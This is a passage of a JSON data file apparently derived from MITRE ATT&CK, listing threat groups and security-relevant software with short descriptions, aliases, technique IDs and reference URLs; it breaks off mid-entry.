      "software": [
        "S0176"
      ],
      "url": "https://attack.mitre.org/groups/G0055",
      "stix_id": "intrusion-set--025bdaa9-897d-4bad-afa6-013ba5734653",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:49:46.469000+00:00"
    },
    "G0017": {
      "id": "G0017",
      "name": "DragonOK",
      "description": "[DragonOK](https://attack.mitre.org/groups/G0017) is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, [DragonOK](https://attack.mitre.org/groups/G0017) is thought to have a direct or indirect relationship with the threat group [Moafee](https://attack.mitre.org/groups/G0002). (Citation: Operation Quantum Entanglement) It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, and NewCT. (Citation: New DragonOK)",
      "aliases": [
        "DragonOK"
      ],
      "techniques": [],
      "software": [
        "S0012",
        "S0013"
      ],
      "url": "https://attack.mitre.org/groups/G0017",
      "stix_id": "intrusion-set--f3bdec95-3d62-42d9-a840-29630f6cdc1a",
      "created": "2017-05-31T21:31:53.197000+00:00",
      "modified": "2024-11-17T16:27:34.666000+00:00"
    },
    "G1028": {
      "id": "G1028",
      "name": "APT-C-23",
      "description": "[APT-C-23](https://attack.mitre.org/groups/G1028) is a threat group that has been active since at least 2014.(Citation: symantec_mantis) [APT-C-23](https://attack.mitre.org/groups/G1028) has primarily focused its operations on the Middle East, including Israeli military assets. [APT-C-23](https://attack.mitre.org/groups/G1028) has developed mobile spyware targeting Android and iOS devices since 2017.(Citation: welivesecurity_apt-c-23)",
      "aliases": [
        "APT-C-23",
        "Mantis",
        "Arid Viper",
        "Desert Falcon",
        "TAG-63",
        "Grey Karkadann",
        "Big Bang APT",
        "Two-tailed Scorpion"
      ],
      "techniques": [],
      "software": [
        "S0339"
      ],
      "url": "https://attack.mitre.org/groups/G1028",
      "stix_id": "intrusion-set--8332952e-b86b-486b-acc3-1c2a85d39394",
      "created": "2024-03-26T18:38:00.759000+00:00",
      "modified": "2024-11-17T20:01:55.806000+00:00"
    }
  },
  "malware": {
    "S0039": {
      "id": "S0039",
      "name": "Net",
      "description": "The [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1201",
        "T1069.002",
        "T1124",
        "T1087.002",
        "T1087.001",
        "T1007",
        "T1018",
        "T1135",
        "T1049",
        "T1070.005",
        "T1569.002",
        "T1136.001",
        "T1098.007",
        "T1069.001",
        "T1021.002",
        "T1136.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0039",
      "stix_id": "tool--03342581-f790-4f03-ba41-e82e67392e23",
      "created": "2017-05-31T21:32:31.601000+00:00",
      "modified": "2024-11-27T21:55:29.681000+00:00"
    },
    "S0592": {
      "id": "S0592",
      "name": "RemoteUtilities",
      "description": "[RemoteUtilities](https://attack.mitre.org/software/S0592) is a legitimate remote administration tool that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2021 for execution on target machines.(Citation: Trend Micro Muddy Water March 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1105",
        "T1218.007",
        "T1113"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0592",
      "stix_id": "tool--03c6e0ea-96d3-4b23-9afb-05055663cf4b",
      "created": "2021-03-18T14:57:34.628000+00:00",
      "modified": "2025-04-25T14:45:11.980000+00:00"
    },
    "S1155": {
      "id": "S1155",
      "name": "Covenant",
      "description": "[Covenant](https://attack.mitre.org/software/S1155) is a multi-platform command and control framework written in .NET. While designed for penetration testing and security research, the tool has also been used by threat actors such as [HAFNIUM](https://attack.mitre.org/groups/G0125) during operations. [Covenant](https://attack.mitre.org/software/S1155) functions through a central listener managing multiple deployed \"Grunts\" that communicate back to the controller.(Citation: Github Covenant)(Citation: Microsoft HAFNIUM March 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.001",
        "T1571",
        "T1047",
        "T1218.010",
        "T1218.004",
        "T1082",
        "T1059.003",
        "T1071.001",
        "T1218.005",
        "T1573.002"
      ],
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1155",
      "stix_id": "tool--05fb53c8-e2ac-4e17-a0c9-a0825e1198bf",
      "created": "2024-09-04T17:08:08.985000+00:00",
      "modified": "2024-09-06T18:11:55.619000+00:00"
    },
    "S1131": {
      "id": "S1131",
      "name": "NPPSPY",
      "description": "NPPSPY is an implementation of a theoretical mechanism first presented in 2004 for capturing credentials submitted to a Windows system via a rogue Network Provider API item. NPPSPY captures credentials following submission and writes them to a file on the victim system for follow-on exfiltration.(Citation: Huntress NPPSPY 2022)(Citation: Polak NPPSPY 2004)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1005",
        "T1557",
        "T1552",
        "T1056",
        "T1119",
        "T1656"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1131",
      "stix_id": "tool--0630d1a7-54da-4a48-a6af-eb8a62b13c17",
      "created": "2024-05-17T18:49:15.318000+00:00",
      "modified": "2024-10-28T19:00:14.732000+00:00"
    },
    "S0521": {
      "id": "S0521",
      "name": "BloodHound",
      "description": "[BloodHound](https://attack.mitre.org/software/S0521) is an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.(Citation: GitHub Bloodhound)(Citation: CrowdStrike BloodHound April 2018)(Citation: FoxIT Wocao December 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1069.002",
        "T1615",
        "T1560",
        "T1069.001",
        "T1087.002",
        "T1087.001",
        "T1033",
        "T1018",
        "T1106",
        "T1059.001",
        "T1482"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0521",
      "stix_id": "tool--066b057c-944e-4cfc-b654-e3dfba04b926",
      "created": "2020-10-28T12:51:29.358000+00:00",
      "modified": "2025-03-12T20:27:03.654000+00:00"
    },
    "S0160": {
      "id": "S0160",
      "name": "certutil",
      "description": "[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1560.001",
        "T1553.004",
        "T1140",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0160",
      "stix_id": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2024-11-27T21:56:15.800000+00:00"
    },
    "S0110": {
      "id": "S0110",
      "name": "at",
      "description": "[at](https://attack.mitre.org/software/S0110) is used to schedule tasks on a system to run at a specified date or time.(Citation: TechNet At)(Citation: Linux at)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.002"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0110",
      "stix_id": "tool--0c8465c0-d0b4-4670-992e-4eee8d7ff952",
      "created": "2017-05-31T21:33:06.824000+00:00",
      "modified": "2025-04-16T20:38:49.779000+00:00"
    },
    "S0116": {
      "id": "S0116",
      "name": "UACMe",
      "description": "[UACMe](https://attack.mitre.org/software/S0116) is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. (Citation: Github UACMe)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1548.002"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0116",
      "stix_id": "tool--102c3898-85e0-43ee-ae28-62a0a3ed9507",
      "created": "2017-05-31T21:33:09.047000+00:00",
      "modified": "2025-04-25T14:45:13.232000+00:00"
    },
    "S0445": {
      "id": "S0445",
      "name": "ShimRatReporter",
      "description": "[ShimRatReporter](https://attack.mitre.org/software/S0445) is a tool used by suspected Chinese adversary [Mofang](https://attack.mitre.org/groups/G0103) to automatically conduct initial discovery. The details from this discovery are used to customize follow-on payloads (such as [ShimRat](https://attack.mitre.org/software/S0444)) as well as set up faux infrastructure which mimics the adversary's targets. [ShimRatReporter](https://attack.mitre.org/software/S0445) has been used in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development.(Citation: FOX-IT May 2016 Mofang)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1041",
        "T1105",
        "T1049",
        "T1518",
        "T1087",
        "T1560",
        "T1036.005",
        "T1016",
        "T1069",
        "T1082",
        "T1020",
        "T1071.001",
        "T1027",
        "T1119",
        "T1106",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0445",
      "stix_id": "tool--115f88dd-0618-4389-83cb-98d33ae81848",
      "created": "2020-05-12T21:29:48.294000+00:00",
      "modified": "2025-04-25T14:45:13.595000+00:00"
    },
    "S0633": {
      "id": "S0633",
      "name": "Sliver",
      "description": "[Sliver](https://attack.mitre.org/software/S0633) is an open source, cross-platform, red team command and control (C2) framework written in Golang. [Sliver](https://attack.mitre.org/software/S0633) includes its own package manager, \"armory,\" for staging and downloading additional tools and payloads to the primary C2 framework.(Citation: Bishop Fox Sliver Framework August 2019)(Citation: Cybereason Sliver Undated)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027",
        "T1055",
        "T1083",
        "T1027.004",
        "T1001.002",
        "T1134",
        "T1059.001",
        "T1071.004",
        "T1027.013",
        "T1573.002",
        "T1090.001",
        "T1016",
        "T1113",
        "T1071.001",
        "T1105",
        "T1573.001",
        "T1071",
        "T1558.001",
        "T1041",
        "T1548.002",
        "T1132.001",
        "T1003.001",
        "T1049"
      ],
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0633",
      "stix_id": "tool--11f8d7eb-1927-4806-9267-3a11d4d4d6be",
      "created": "2021-07-30T15:43:17.770000+00:00",
      "modified": "2025-03-24T16:00:41.005000+00:00"
    },
    "S0692": {
      "id": "S0692",
      "name": "SILENTTRINITY",
      "description": "[SILENTTRINITY](https://attack.mitre.org/software/S0692) is an open source remote administration and post-exploitation framework primarily written in Python that includes stagers written in Powershell, C, and Boo. [SILENTTRINITY](https://attack.mitre.org/software/S0692) was used in a 2019 campaign against Croatian government agencies by unidentified cyber actors.(Citation: GitHub SILENTTRINITY March 2022)(Citation: Security Affairs SILENTTRINITY July 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1552.006",
        "T1620",
        "T1069.002",
        "T1105",
        "T1546.001",
        "T1115",
        "T1562.001",
        "T1070",
        "T1003.001",
        "T1135",
        "T1564.003",
        "T1543.003",
        "T1069.001",
        "T1113",
        "T1047",
        "T1055",
        "T1112",
        "T1124",
        "T1546.003",
        "T1134.001",
        "T1556",
        "T1012",
        "T1087.002",
        "T1018",
        "T1070.004",
        "T1134.003",
        "T1059.006",
        "T1046",
        "T1059.001",
        "T1555.003",
        "T1106",
        "T1558.003",
        "T1546.015",
        "T1041",
        "T1555.004",
        "T1021.003",
        "T1083",
        "T1548.002",
        "T1559.001",
        "T1059.003",
        "T1562.010",
        "T1010",
        "T1021.006",
        "T1562.003",
        "T1547.001",
        "T1057",
        "T1056.002",
        "T1056.001",
        "T1033",
        "T1518.001",
        "T1082",
        "T1007"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0692",
      "stix_id": "tool--1244e058-fa10-48cb-b484-0bcf671107ae",
      "created": "2022-03-23T19:34:30.486000+00:00",
      "modified": "2025-04-30T13:26:45.728000+00:00"
    },
    "S0194": {
      "id": "S0194",
      "name": "PowerSploit",
      "description": "[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1574.007",
        "T1056.001",
        "T1620",
        "T1552.002",
        "T1027.005",
        "T1123",
        "T1047",
        "T1574.009",
        "T1012",
        "T1005",
        "T1552.006",
        "T1055.001",
        "T1027.010",
        "T1134",
        "T1543.003",
        "T1113",
        "T1547.001",
        "T1053.005",
        "T1574.001",
        "T1574.008",
        "T1558.003",
        "T1087.001",
        "T1547.005",
        "T1057",
        "T1555.004",
        "T1059.001",
        "T1482",
        "T1003.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0194",
      "stix_id": "tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:38:50.246000+00:00"
    },
    "S1091": {
      "id": "S1091",
      "name": "Pacu",
      "description": "Pacu is an open-source AWS exploitation framework. The tool is written in Python and publicly available on GitHub.(Citation: GitHub Pacu)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1648",
        "T1562.008",
        "T1619",
        "T1049",
        "T1654",
        "T1526",
        "T1552",
        "T1546",
        "T1069.003",
        "T1098.001",
        "T1562.007",
        "T1555.006",
        "T1580",
        "T1059.009",
        "T1530",
        "T1078.004",
        "T1119",
        "T1518.001",
        "T1578.001",
        "T1087.004",
        "T1651"
      ],
      "platforms": [
        "IaaS"
      ],
      "url": "https://attack.mitre.org/software/S1091",
      "stix_id": "tool--1b3b8f96-43b1-4460-8e02-1f53d7802fb9",
      "created": "2023-09-28T13:21:49.652000+00:00",
      "modified": "2023-10-19T12:18:43.123000+00:00"
    },
    "S0005": {
      "id": "S0005",
      "name": "Windows Credential Editor",
      "description": "[Windows Credential Editor](https://attack.mitre.org/software/S0005) is a password dumping tool. (Citation: Amplia WCE)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0005",
      "stix_id": "tool--242f3da3-4425-4d11-8f5c-b842886da966",
      "created": "2017-05-31T21:32:12.684000+00:00",
      "modified": "2024-09-12T15:17:22.004000+00:00"
    },
    "S0357": {
      "id": "S0357",
      "name": "Impacket",
      "description": "[Impacket](https://attack.mitre.org/software/S0357) is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. [Impacket](https://attack.mitre.org/software/S0357) contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.(Citation: Impacket Tools)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1557.001",
        "T1040",
        "T1558.003",
        "T1558.005",
        "T1003.003",
        "T1569.002",
        "T1003.001",
        "T1047",
        "T1003.002",
        "T1570",
        "T1003.004"
      ],
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0357",
      "stix_id": "tool--26c87906-d750-42c5-946c-d4162c73fc7b",
      "created": "2019-01-31T01:39:56.283000+00:00",
      "modified": "2025-04-04T17:16:12.597000+00:00"
    },
    "S0100": {
      "id": "S0100",
      "name": "ipconfig",
      "description": "[ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. (Citation: TechNet Ipconfig)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0100",
      "stix_id": "tool--294e2560-bd48-44b2-9da2-833b5588ad11",
      "created": "2017-05-31T21:33:02.863000+00:00",
      "modified": "2025-04-16T20:38:50.417000+00:00"
    },
    "S0677": {
      "id": "S0677",
      "name": "AADInternals",
      "description": "[AADInternals](https://attack.mitre.org/software/S0677) is a PowerShell-based framework for administering, enumerating, and exploiting Azure Active Directory. The tool is publicly available on GitHub.(Citation: AADInternals Github)(Citation: AADInternals Documentation)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1526",
        "T1649",
        "T1556.007",
        "T1098.005",
        "T1598.003",
        "T1552.001",
        "T1484.002",
        "T1566.002",
        "T1069.003",
        "T1136.003",
        "T1606.002",
        "T1590.001",
        "T1589.002",
        "T1558.002",
        "T1552.004",
        "T1528",
        "T1087.004",
        "T1003.004",
        "T1556.006",
        "T1651",
        "T1530",
        "T1059.001",
        "T1112",
        "T1048"
      ],
      "platforms": [
        "Windows",
        "Office Suite",
        "Identity Provider"
      ],
      "url": "https://attack.mitre.org/software/S0677",
      "stix_id": "tool--2c5281dd-b5fd-4531-8aea-c1bf8a0f8756",
      "created": "2022-02-01T15:08:45.007000+00:00",
      "modified": "2025-04-16T20:38:50.579000+00:00"
    },
    "S0057": {
      "id": "S0057",
      "name": "Tasklist",
      "description": "The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1007",
        "T1518.001"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0057",
      "stix_id": "tool--2e45723a-31da-4a7e-aaa6-e01998a6788f",
      "created": "2017-05-31T21:32:39.233000+00:00",
      "modified": "2024-02-12T19:14:37.984000+00:00"
    },
    "S0508": {
      "id": "S0508",
      "name": "ngrok",
      "description": "[ngrok](https://attack.mitre.org/software/S0508) is a legitimate reverse proxy tool that can create a secure tunnel to servers located behind firewalls or on local machines that do not have a public IP. [ngrok](https://attack.mitre.org/software/S0508) has been leveraged by threat actors in several campaigns including use for lateral movement and data exfiltration.(Citation: Zdnet Ngrok September 2018)(Citation: FireEye Maze May 2020)(Citation: Cyware Ngrok May 2019)(Citation: MalwareBytes LazyScripter Feb 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090",
        "T1567",
        "T1568.002",
        "T1102",
        "T1572"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0508",
      "stix_id": "tool--2f7f03bb-f367-4a5a-ad9b-310a12a48906",
      "created": "2023-09-14T18:56:34.771000+00:00",
      "modified": "2024-11-27T21:35:52.624000+00:00"
    },
    "S0121": {
      "id": "S0121",
      "name": "Lslsass",
      "description": "[Lslsass](https://attack.mitre.org/software/S0121) is a publicly-available tool that can dump active logon session password hashes from the lsass process. (Citation: Mandiant APT1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0121",
      "stix_id": "tool--2fab555f-7664-4623-b4e0-1675ae38190b",
      "created": "2017-05-31T21:33:10.962000+00:00",
      "modified": "2025-04-25T14:45:15.980000+00:00"
    },
    "S0099": {
      "id": "S0099",
      "name": "Arp",
      "description": "[Arp](https://attack.mitre.org/software/S0099) displays and modifies information about a system's Address Resolution Protocol (ARP) cache. (Citation: TechNet Arp)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1018",
        "T1016"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0099",
      "stix_id": "tool--30489451-5886-4c46-90c9-0dff9adc5252",
      "created": "2017-05-31T21:33:02.428000+00:00",
      "modified": "2025-04-16T20:38:50.933000+00:00"
    },
    "S0227": {
      "id": "S0227",
      "name": "spwebmember",
      "description": "[spwebmember](https://attack.mitre.org/software/S0227) is a Microsoft SharePoint enumeration and data dumping tool written in .NET. (Citation: NCC Group APT15 Alive and Strong)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1213.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0227",
      "stix_id": "tool--33b9e38f-103c-412d-bdcf-904a91fff1e4",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:45:16.528000+00:00"
    },
    "S0363": {
      "id": "S0363",
      "name": "Empire",
      "description": "[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1059/001) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1125",
        "T1021.003",
        "T1557.001",
        "T1016",
        "T1059.001",
        "T1482",
        "T1056.001",
        "T1027.010",
        "T1136.001",
        "T1113",
        "T1046",
        "T1552.001",
        "T1560",
        "T1484.001",
        "T1041",
        "T1082",
        "T1115",
        "T1068",
        "T1020",
        "T1546.008",
        "T1119",
        "T1615",
        "T1087.002",
        "T1547.005",
        "T1021.004",
        "T1558.003",
        "T1134.005",
        "T1574.009",
        "T1547.001",
        "T1135",
        "T1574.008",
        "T1558.001",
        "T1210",
        "T1569.002",
        "T1567.001",
        "T1083",
        "T1056.004",
        "T1574.007",
        "T1106",
        "T1047",
        "T1055",
        "T1550.002",
        "T1217",
        "T1127.001",
        "T1552.004",
        "T1567.002",
        "T1071.001",
        "T1134",
        "T1040",
        "T1114.001",
        "T1059.003",
        "T1102.002",
        "T1555.003",
        "T1518.001",
        "T1087.001",
        "T1574.004",
        "T1049",
        "T1053.005",
        "T1003.001",
        "T1573.002",
        "T1134.002",
        "T1543.003",
        "T1059",
        "T1057",
        "T1105",
        "T1070.006",
        "T1547.009",
        "T1574.001",
        "T1136.002",
        "T1033",
        "T1548.002",
        "T1558.002"
      ],
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0363",
      "stix_id": "tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3",
      "created": "2019-03-11T14:13:40.648000+00:00",
      "modified": "2024-09-25T20:32:02.152000+00:00"
    },
    "S0101": {
      "id": "S0101",
      "name": "ifconfig",
      "description": "[ifconfig](https://attack.mitre.org/software/S0101) is a Unix-based utility used to gather information about and interact with the TCP/IP settings on a system. (Citation: Wikipedia Ifconfig)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0101",
      "stix_id": "tool--362dc67f-4e85-4562-9dac-1b6b7f3ec4b5",
      "created": "2017-05-31T21:33:03.377000+00:00",
      "modified": "2025-04-25T14:45:17.053000+00:00"
    },
    "S1144": {
      "id": "S1144",
      "name": "FRP",
      "description": "[FRP](https://attack.mitre.org/software/S1144), which stands for Fast Reverse Proxy, is an openly available tool that is capable of exposing a server located behind a firewall or Network Address Translation (NAT) to the Internet. [FRP](https://attack.mitre.org/software/S1144) can support multiple protocols including TCP, UDP, and HTTP(S) and has been abused by threat actors to proxy command and control communications.(Citation: FRP GitHub)(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023)(Citation: RedCanary Mockingbird May 2020)(Citation: DFIR Phosphorus November 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1095",
        "T1059.007",
        "T1090",
        "T1572",
        "T1573.002",
        "T1046",
        "T1049",
        "T1090.003",
        "T1573.001",
        "T1071.001"
      ],
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1144",
      "stix_id": "tool--36dd807e-b5bc-4c3e-91ed-80682360148c",
      "created": "2024-07-10T18:46:33.555000+00:00",
      "modified": "2024-07-30T18:17:09.725000+00:00"
    },
    "S0105": {
      "id": "S0105",
      "name": "dsquery",
      "description": "[dsquery](https://attack.mitre.org/software/S0105) is a command-line utility that can be used to query Active Directory for information from a system within a domain. (Citation: TechNet Dsquery) It is typically installed only on Windows Server versions but can be installed on non-server variants through the Microsoft-provided Remote Server Administration Tools bundle.",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1087.002",
        "T1482",
        "T1069.002",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0105",
      "stix_id": "tool--38952eac-cb1b-4a71-bad2-ee8223a1c8fe",
      "created": "2017-05-31T21:33:04.937000+00:00",
      "modified": "2025-04-16T20:38:51.407000+00:00"
    },
    "S1050": {
      "id": "S1050",
      "name": "PcShare",
      "description": "[PcShare](https://attack.mitre.org/software/S1050) is an open source remote access tool that has been modified and used by Chinese threat actors, most notably during the FunnyDream campaign since late 2018.(Citation: Bitdefender FunnyDream Campaign November 2020)(Citation: GitHub PcShare 2014)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1071.001",
        "T1057",
        "T1113",
        "T1016",
        "T1027.015",
        "T1059.003",
        "T1027.013",
        "T1546.015",
        "T1056.001",
        "T1005",
        "T1218.011",
        "T1140",
        "T1012",
        "T1070.004",
        "T1041",
        "T1036.001",
        "T1112",
        "T1106",
        "T1055",
        "T1125"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1050",
      "stix_id": "tool--3a53b207-aba2-4a2b-9cdb-273d633669e7",
      "created": "2022-10-13T14:07:52.541000+00:00",
      "modified": "2024-04-11T00:28:17.175000+00:00"
    },
    "S0364": {
      "id": "S0364",
      "name": "RawDisk",
      "description": "[RawDisk](https://attack.mitre.org/software/S0364) is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.(Citation: EldoS RawDisk ITpro)(Citation: Novetta Blockbuster Destructive Malware)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1561.002",
        "T1561.001",
        "T1485"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0364",
      "stix_id": "tool--3ffbdc1f-d2bf-41ab-91a2-c7b857e98079",
      "created": "2019-03-25T12:30:40.919000+00:00",
      "modified": "2024-11-17T19:51:16.652000+00:00"
    },
    "S0104": {
      "id": "S0104",
      "name": "netstat",
      "description": "[netstat](https://attack.mitre.org/software/S0104) is an operating system utility that displays active TCP connections, listening ports, and network statistics. (Citation: TechNet Netstat)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1049"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0104",
      "stix_id": "tool--4664b683-f578-434f-919b-1c1aad2a1111",
      "created": "2017-05-31T21:33:04.545000+00:00",
      "modified": "2024-11-27T21:54:49.561000+00:00"
    },
    "S0378": {
      "id": "S0378",
      "name": "PoshC2",
      "description": "[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1059/001). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1552.001",
        "T1557.001",
        "T1071.001",
        "T1047",
        "T1049",
        "T1068",
        "T1007",
        "T1134.002",
        "T1548.002",
        "T1569.002",
        "T1087.001",
        "T1119",
        "T1082",
        "T1056.001",
        "T1087.002",
        "T1560.001",
        "T1550.002",
        "T1069.001",
        "T1083",
        "T1090",
        "T1110",
        "T1003.001",
        "T1055",
        "T1210",
        "T1482",
        "T1134",
        "T1046",
        "T1555",
        "T1040",
        "T1546.003",
        "T1201"
      ],
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0378",
      "stix_id": "tool--4b57c098-f043-4da2-83ef-7588a6d426bc",
      "created": "2019-04-23T12:31:58.125000+00:00",
      "modified": "2025-04-16T20:38:51.558000+00:00"
    },
    "S0120": {
      "id": "S0120",
      "name": "Fgdump",
      "description": "[Fgdump](https://attack.mitre.org/software/S0120) is a Windows password hash dumper. (Citation: Mandiant APT1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0120",
      "stix_id": "tool--4f45dfeb-fe51-4df0-8db3-edf7dd0513fe",
      "created": "2017-05-31T21:33:10.569000+00:00",
      "modified": "2025-04-25T14:45:18.484000+00:00"
    },
    "S0123": {
      "id": "S0123",
      "name": "xCmd",
      "description": "[xCmd](https://attack.mitre.org/software/S0123) is an open source tool that is similar to [PsExec](https://attack.mitre.org/software/S0029) and allows the user to execute applications on remote systems. (Citation: xCmd)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1569.002"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0123",
      "stix_id": "tool--4fa49fc0-9162-4bdb-a37e-7aa3dcb6d38b",
      "created": "2017-05-31T21:33:11.941000+00:00",
      "modified": "2025-04-25T14:45:18.852000+00:00"
    },
    "S0527": {
      "id": "S0527",
      "name": "CSPY Downloader",
      "description": "[CSPY Downloader](https://attack.mitre.org/software/S0527) is a tool designed to evade analysis and download additional payloads used by [Kimsuky](https://attack.mitre.org/groups/G0094).(Citation: Cybereason Kimsuky November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1112",
